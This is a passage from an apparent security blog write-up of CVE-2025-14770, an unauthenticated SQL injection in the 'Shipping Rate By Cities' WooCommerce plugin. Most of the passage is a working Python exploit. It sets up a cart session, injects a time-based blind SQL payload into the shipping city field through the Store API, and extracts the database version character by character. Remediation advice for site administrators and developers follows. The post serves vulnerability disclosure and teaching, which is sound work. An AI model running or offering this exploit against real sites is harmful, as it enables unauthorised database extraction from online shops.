s.headers.update(&#123;</span><br><span class="line">            <span class="string">&quot;Nonce&quot;</span>: nonce,</span><br><span class="line">            <span class="string">&quot;Cart-Token&quot;</span>: cart_token,</span><br><span class="line">            <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span></span><br><span class="line">        &#125;)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># Second request: Actually add the item to ensure the cart is not empty</span></span><br><span class="line">        <span class="comment"># (Shipping calculation only triggers if cart &gt; 0)</span></span><br><span class="line">        r = s.post(API_ADD_ITEM, json=&#123;<span class="string">&quot;id&quot;</span>: PRODUCT_ID, <span class="string">&quot;quantity&quot;</span>: <span class="number">1</span>&#125;)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;items_count&quot;</span> <span class="keyword">in</span> r.text <span class="keyword">and</span> r.json().get(<span class="string">&#x27;items_count&#x27;</span>, <span class="number">0</span>) &gt; <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[+] Product added successfully. Cart is ready.&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[-] Failed to add product. Response: <span class="subst">&#123;r.text&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            </span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[-] Connection Error: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inject_payload</span>(<span class="params">sql_condition</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Sends the malicious payload to the shipping_address city field.</span></span><br><span class="line"><span class="string">    Returns the elapsed time of the request.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># The vulnerability allows injecting into the &#x27;city&#x27; field.</span></span><br><span class="line">    <span class="comment"># Logic: If the condition is TRUE, the DB sleeps.</span></span><br><span class="line">    <span class="comment"># Payload format: Hanoi&#x27; OR IF(&lt;CONDITION&gt;, SLEEP(T), 0) -- </span></span><br><span class="line">    payload = <span class="string">f&quot;Hanoi&#x27; OR IF(<span class="subst">&#123;sql_condition&#125;</span>, SLEEP(<span class="subst">&#123;SLEEP_TIME&#125;</span>), 0) -- &quot;</span></span><br><span class="line">    </span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;billing_address&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;city&quot;</span>: <span class="string">&quot;Hanoi&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&quot;shipping_address&quot;</span>: &#123;</span><br><span class="line">            <span class="string">&quot;city&quot;</span>: payload</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    start_time = time.time()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># We don&#x27;t care about the response content, only the time it took</span></span><br><span class="line">        s.post(API_UPDATE_CUSTOMER, json=data)</span><br><span class="line">        elapsed_time = time.time() - start_time</span><br><span class="line">        <span class="keyword">return</span> elapsed_time</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[!] Request Error: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_data</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Performs the Time-Based Blind SQL Injection to extract the Database Version.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n[*] Starting Blind SQL Injection Attack...&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Target: @@version&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    extracted_value = <span class="string">&quot;&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Iterate through character positions (Assuming length &lt; 20 for demo)</span></span><br><span class="line">    <span class="keyword">for</span> position <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">25</span>):</span><br><span class="line">        found_char = <span class="literal">False</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># Iterate through printable characters</span></span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> string.printable:</span><br><span class="line">            <span class="comment"># Skip characters that might break JSON or SQL string escaping for simplicity</span></span><br><span class="line">            <span class="keyword">if</span> char <span class="keyword">in</span> [<span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;\\&#x27;</span>, <span class="string">&quot;&#x27;&quot;</span>]: <span class="keyword">continue</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment"># Construct SQL: Check if character at current position matches our guess</span></span><br><span class="line">            <span class="comment"># Using ASCII() avoids issues with quotes inside the SQL string</span></span><br><span class="line">            sql_condition = <span class="string">f&quot;ASCII(SUBSTRING(@@version,<span class="subst">&#123;position&#125;</span>,1))=<span class="subst">&#123;<span class="built_in">ord</span>(char)&#125;</span>&quot;</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment"># Send request and measure time</span></span><br><span class="line">            sys.stdout.write(<span class="string">f&quot;\r[&gt;] Testing pos <span class="subst">&#123;position&#125;</span>: <span class="subst">&#123;char&#125;</span> | Found: <span class="subst">&#123;extracted_value&#125;</span>&quot;</span>)</span><br><span class="line">            sys.stdout.flush()</span><br><span class="line">            </span><br><span class="line">            duration = inject_payload(sql_condition)</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># If response time &gt;= SLEEP_TIME, we found the character</span></span><br><span class="line">            <span class="keyword">if</span> duration &gt;= SLEEP_TIME:</span><br><span class="line">                extracted_value += char</span><br><span class="line">                found_char = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">break</span> <span class="comment"># Move to next position</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> found_char:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;\n[*] End of string or character not found.&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">            </span><br><span class="line">    <span class="keyword">return</span> extracted_value</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;==================================================&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;   CVE-2025-14770 Exploit (Time-Based SQLi)       &quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;   Target: WooCommerce Shipping Rate By Cities    &quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;==================================================&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> setup_session():</span><br><span class="line">        result = extract_data()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span> + <span class="string">&quot;=&quot;</span>*<span class="number">50</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[SUCCESS] Database Version: <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">50</span>)</span><br></pre></td></tr></table></figure>
</details>
    
<p><img src="https://hackmd.io/_uploads/HJcdYr_Ubg.png" alt="image"></p>
<p>Successful dump the database version.</p>
<h2 id="Remediation-Recommendations"><a href="#Remediation-Recommendations" class="headerlink" title="Remediation &amp; Recommendations"></a>Remediation &amp; Recommendations</h2><p><strong>For Site Administrators</strong></p>
<ul>
<li><strong>Immediate Update:</strong> If you are using the “Shipping Rate by Cities” plugin, ensure you have updated to version 2.0.1 or higher. This version includes the critical security patches analyzed in this report.</li>
<li><strong>Deploy a Web Application Firewall (WAF):</strong> Use a WAF (such as Cloudflare, Wordfence, or Sucuri) to detect and block common SQL injection patterns (e.g., SLEEP(), UNION SELECT), while acknowledging that WAFs should not be relied upon as the sole defense.</li>
<li><strong>Audit Database Permissions:</strong> Ensure the database user for WordPress has the least privilege necessary. This limits the potential damage if an SQL injection vulnerability is exploited.</li>
</ul>
<p><strong>For Developers</strong></p>
<ul>
<li><strong>Never Trust User Input:</strong> Always treat data coming from APIs or forms as untrusted. Use built-in WordPress sanitization functions like sanitize_text_field() or absint() as a first layer of defense.</li>
<li><strong>Mandatory use of $wpdb-&gt;prepare():</strong> Never concatenate variables directly into SQL queries. The $wpdb-&gt;prepare() method is the industry standard for preventing SQLi in WordPress by ensuring that data is safely escaped and handled as a literal value.</li>
<li><strong>Implement Rate Limiting:</strong> Since this vulnerability is unauthenticated, implement rate limiting on sensitive endpoints like &#x2F;wp-json&#x2F;wc&#x2F;store&#x2F;v1&#x2F;cart&#x2F;update-customer to prevent automated scanning and brute-forcing.</li>
</ul>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="https://pzhat.github.io">Phat Mai</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="https://pzhat.github.io/2026/01/27/2026-01-27-CVE-2025-14770/">https://pzhat.github.io/2026/01/27/2026-01-27-CVE-2025-14770/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Web/">Web</a><a class="post-meta__tags" href="/tags/WordPress/">WordPress</a></div><div class="post-share"><div class="social-share" data-image="/img/avatar.jpg" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2026/02/01/2026-02-01-CVE-2025-68519/" title="CVE-2025-68519 WordPress Brands for WooCommerce Plugin"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">Previous</div><div class="info-item-2">CVE-2025-68519 WordPress Brands for WooCommerce Plugin</div></div><div class="info-2"><div class="info-item-1">CVE-2025-68519 WordPress Brands for WooCommerce Plugin &lt;&#x3D; 3.8.6.3 is vulnerable to SQL Injection WordPress Brands for WooCommerce PluginOverview Published: 2025-12-24 CVE ID: CVE-2025-68519 Affected Plugin: WordPress Brands for WooCommerce Affected Versions: &lt;&#x3D; 3.8.6.3  Vulnerability Type: SQL Injection vulnerability  DescriptionImproper Neutralization of Special Elements used in an SQL Command (‘SQL Injection’) vulnerability in BeRocket Brands for WooCommerce brands-for-wooco...</div></div></div></a><a class="pagination-related" href="/2026/01/21/2026-01-21-Ysoserial-CC3-Analyst/" title="Ysoserial Common Collections 3 Analyst (CC3)"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">Ysoserial Common Collections 3 Analyst (CC3)</div></div><div class="info-2"><div class="info-item-1">Ysoserial Common Collections 3 Analyst (CC3)Tổng quanCC3 (CommonsCollections3) trong ysoserial là một gadget chain dựa trên thư viện Apache Commons Collections để kích hoạt hành vi nguy hiểm thông qua Java deserialization. Nó dựa vào cách một số lớp trong thư viện có thể được “xâu chuỗi” (chain) để thực thi logic ngoài ý muốn khi một đối tượng được deserialization. SetUp Debug trong IntelliJ  Lúc tiến hành setup để có thể debug, phải chú ý rằng CC1 và CC3 đã không còn chạy được sau Java versi...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2026/02/01/2026-02-01-CVE-2025-68519/" title="CVE-2025-68519 WordPress Brands for WooCommerce Plugin"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-02-01</div><div class="info-item-2">CVE-2025-68519 WordPress Brands for WooCommerce Plugin</div></div><div class="info-2"><div class="info-item-1">CVE-2025-68519 WordPress Brands for WooCommerce Plugin &lt;&#x3D; 3.8.6.3 is vulnerable to SQL Injection WordPress Brands for WooCommerce PluginOverview Published: 2025-12-24 CVE ID: CVE-2025-68519 Affected Plugin: WordPress Brands for WooCommerce Affected Versions: &lt;&#x3D; 3.8.6.3  Vulnerability Type: SQL Injection vulnerability  DescriptionImproper Neutralization of Special Elements used in an SQL Command (‘SQL Injection’) vulnerability in BeRocket Brands for WooCommerce brands-for-wooco...</div></div></div></a><a class="pagination-related" href="/2026/02/03/2026-02-03-CVE-2025-13329/" title="CVE-2025-13329 File Uploader for WooCommerce"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-02-03</div><div class="info-item-2">CVE-2025-13329 File Uploader for WooCommerce</div></div><div class="info-2"><div class="info-item-1">CVE-2025-13329 File Uploader for WooCommerce &lt;&#x3D; 1.0.3 - Unauthenticated Arbitrary File Upload via add-image-data File Uploader for WooCommerce PluginOverview Published: 2025-12-20 CVE-ID: CVE-2025-13329 Affected Plugin: File Uploader for WooCommerce Affected Versions: &lt;&#x3D; 1.0.3 Vulnerability Type: Unauthenticated Arbitrary File Upload via add-image-data CWE-434: CWE-434 Unrestricted Upload of File with Dangerous Type  DescriptionThe File Uploader for WooCommerce plugin for Word...</div></div></div></a><a class="pagination-related" href="/2025/11/15/2025-09-09-CanteenFood-CTF-Challenge-WriteUp/" title="CanteenFood CTF Challenge WriteUp"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-11-15</div><div class="info-item-2">CanteenFood CTF Challenge WriteUp</div></div><div class="info-2"><div class="info-item-1">CanteenFood CTF Challenge WriteUp by @PhatmhTiến hành phân tích chức năng theo kiểu BlackBox Đây là một trang Web có chức năng cho User tìm kiếm được món ăn phù hợp với túi tiền của mình nhất bằng cách nhập số tiền mình mong muốn nó sẽ trả về món mà mình đủ tiền trả.  Ở đây sau khi viết ra số 300 và tiến hành bấm chức năng thì nó trả về được list các món dưới 300.  Ở ngay bên trên mình phát hiện được một nơi đáng ngờ là chữ admin có thể dẫn ta đi đâu đó vì thể click thử vào.  Nó trả về cho ta...</div></div></div></a><a class="pagination-related" href="/2025/11/15/2025-09-09-FileUpload-Servlet/" title="Java Servlet FileUpload Vulnerability"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-11-15</div><div class="info-item-2">Java Servlet FileUpload Vulnerability</div></div><div class="info-2"><div class="info-item-1">Java Servlet FileUpload Vulnerability by @PhatmhLỗ hổng File UploadBản chất của File Upload: File Upload đối với tôi nó đơn giản chỉ là lợidụng Unsafe Method để truyền một Untrusted Data vào nhằm thay đổi hànhvi của hệ thống trong trường hợp này là Web App, với FileUpload những gìUser Upload lên sẽ chính là Untrusted Data và với Feature Upload Filenhư này sẽ thế nào nếu nó không được Validate một cách cẩn thận ta sẽđến với DEMO bằng Java Servlet. Web App OverviewĐây là một Web App được dựng v...</div></div></div></a><a class="pagination-related" href="/2025/11/15/2025-09-09-Servlet-Sql-Injection/" title="Java Servlet Sql Injection Vulnerability by @Phatmh"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-11-15</div><div class="info-item-2">Java Servlet Sql Injection Vulnerability by @Phatmh</div></div><div class="info-2"><div class="info-item-1">Java Servlet Sql Injection Vulnerability by @PhatmhTổng quan cấu trúc file java123456789101112131415161718192021222324252627282930313233343536373839+---.idea   +---dataSources+---.mvn   +---wrapper+---src   +---main      +---java         +---sql_injection             +---controller             +---dao             +---model             +---util      +---resources         +---META-INF      +---webapp          +---WEB-INF   +---test       +---java       +---resources+---target    +---classes    ...</div></div></div></a><a class="pagination-related" href="/2025/11/15/2025-09-09-Servlet-Cmdi/" title="Java Servlet Command Injection Vulnerability Challenges"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-11-15</div><div class="info-item-2">Java Servlet Command Injection Vulnerability Challenges</div></div><div class="info-2"><div class="info-item-1">Java Servlet Command Injection Vulnerability ChallengesCấu trúc Project Cấu trúc Project   1234567891011121314151617181920212223242526272829303132333435+---.idea+---.mvnª   +---wrapper+---srcª   +---mainª   ª   +---javaª   ª   ª   +---ciª   ª   ª       +---controllerª   ª   ª       +---serviceª   ª   ª       +---utilª   ª   +---resourcesª   ª   ª   +---META-INFª   ª   +---webappª   ª       +---WEB-INFª   +---testª       +---javaª       +---resources+---target    +---classes    ª   +---ci    ª...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Phat Mai</div><div class="author-info-description">Pentester/Redteam</div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">38</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">8</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">9</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/pzhat"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/pzhat" target="_blank" title="GitHub"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="https://www.linkedin.com/in/phat-mai-hong-2580a52aa/" target="_blank" title="LinkedIn"><i class="fab fa-linkedin" style="color: #0A66C2;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">Blog about cybersecurity, hacking, pentesting, red teaming and more...</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#WordPress-Shipping-Rate-By-Cities-Plugin"><span class="toc-number">1.</span> <span class="toc-text">WordPress Shipping Rate By Cities Plugin</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Overview"><span class="toc-number">1.1.</span> <span class="toc-text">Overview</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Description"><span class="toc-number">1.2.</span> <span class="toc-text">Description</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Patch-Commit-Analysis"><span class="toc-number">1.3.</span> <span class="toc-text">Patch &amp; Commit Analysis</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Attack-Flow"><span class="toc-number">1.4.</span> <span class="toc-text">Attack Flow</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SINK-SOURCE-Backtrace"><span class="toc-number">1.5.</span> <span class="toc-text">SINK -&gt; SOURCE (Backtrace)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#POC-And-Debug"><span class="toc-number">1.6.</span> <span class="toc-text">POC And Debug</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Remediation-Recommendations"><span class="toc-number">1.7.</span> <span class="toc-text">Remediation &amp; Recommendations</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/02/03/2026-02-03-CVE-2025-13329/" title="CVE-2025-13329 File Uploader for WooCommerce">CVE-2025-13329 File Uploader for WooCommerce</a><time datetime="2026-02-03T15:56:51.995Z" title="Created 2026-02-03 22:56:51">2026-02-03</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/02/01/2026-02-01-CVE-2025-68519/" title="CVE-2025-68519 WordPress Brands for WooCommerce Plugin">CVE-2025-68519 WordPress Brands for WooCommerce Plugin</a><time datetime="2026-01-31T17:12:36.483Z" title="Created 2026-02-01 00:12:36">2026-02-01</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/01/27/2026-01-27-CVE-2025-14770/" title="CVE-2025-14770 – Unauthenticated SQL Injection via “city” Parameter">CVE-2025-14770 – Unauthenticated SQL Injection via “city” Parameter</a><time datetime="2026-01-27T14:19:14.489Z" title="Created 2026-01-27 21:19:14">2026-01-27</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/01/21/2026-01-21-Ysoserial-CC3-Analyst/" title="Ysoserial Common Collections 3 Analyst (CC3)">Ysoserial Common Collections 3 Analyst (CC3)</a><time datetime="2026-01-21T05:35:18.206Z" title="Created 2026-01-21 12:35:18">2026-01-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/12/31/2025-12-31-SSTI-Velocity/" title="Velocity Server Side Template Injection Challenge">Velocity Server Side Template Injection Challenge</a><time datetime="2025-12-31T04:43:06.549Z" title="Created 2025-12-31 11:43:06">2025-12-31</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By Phat Mai</span><span class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 8.1.1</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.2</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.2"></script><script src="/js/main.js?v=5.5.2"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@6.1.4/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="/"></script></div></body></html>